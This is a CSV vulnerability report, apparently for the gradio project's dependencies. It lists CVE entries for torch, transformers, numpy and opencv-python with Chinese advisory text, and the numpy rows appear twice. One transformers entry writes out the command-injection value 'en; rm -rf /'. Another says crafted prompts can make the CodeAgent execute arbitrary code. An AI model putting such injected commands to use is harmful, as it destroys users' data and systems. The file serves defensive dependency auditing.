gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2019-14493,CWE-476,2019-08-01,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.1之前版本中的modules/core/src/persistence.cpp文件的‘cv::XMLParser::parse’函数存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2017-12605,CWE-787,2017-08-07,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的utils.cpp文件的‘FillColorRow8’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12863,CWE-190,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的opencv/modules/imgcodecs/src/grfmt_pxm.cpp文件的‘PxMDecoder::readData’函数存在整数溢出漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2018-5268,CWE-787,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_jpeg2000.cpp文件的‘cv::Jpeg2KDecoder::readComponent8u’函数存在基于堆的缓冲区溢出漏洞。攻击者可借助特制的图像文件利用该漏洞造成拒绝服务（崩溃）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-12862,CWE-787,2017-08-15,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3及之前的版本中的modules/imgcodecs/src/grfmt_pxm.cpp文件存在安全漏洞。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-14136,CWE-787,2017-09-04,"OpenCV(Open Source Computer Vision Library)是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3版本中的utils.cpp文件的‘FillColorRow1’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界写入）。",3,0
gradio-app_gradio,opencv-python,,True,CVE-2017-1000450,CWE-190,2018-01-02,"Opencv是一个开源的、跨平台的、轻量级的计算机视觉库。
Opencv 3.3及之前的版本中的opencv/modules/imgcodecs/src/utils.cpp文件的‘FillUniColor’和‘FillUniGray’函数存在整数溢出漏洞，该漏洞源于程序没有检测输入的长度。远程攻击者可利用该漏洞执行代码或造成拒绝服务。",2,0
gradio-app_gradio,opencv-python,,True,CVE-2017-18009,CWE-125,2018-01-01,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。

OpenCV 3.3.1版本中的modules/imgcodecs/src/grfmt_hdr.cpp文件的‘cv::HdrDecoder::checkSignature’函数存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（基于堆的缓冲区越边界读取）。",2,2
gradio-app_gradio,opencv-python,,True,CVE-2018-5269,CWE-617,2018-01-08,"OpenCV是一个开源的、跨平台的、轻量级的计算机视觉库。
OpenCV 3.3.1版本中的modules/imgcodecs/src/bitstrm.cpp文件的‘cv::RBaseStream::setPos’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（断言失败和崩溃）。",3,0
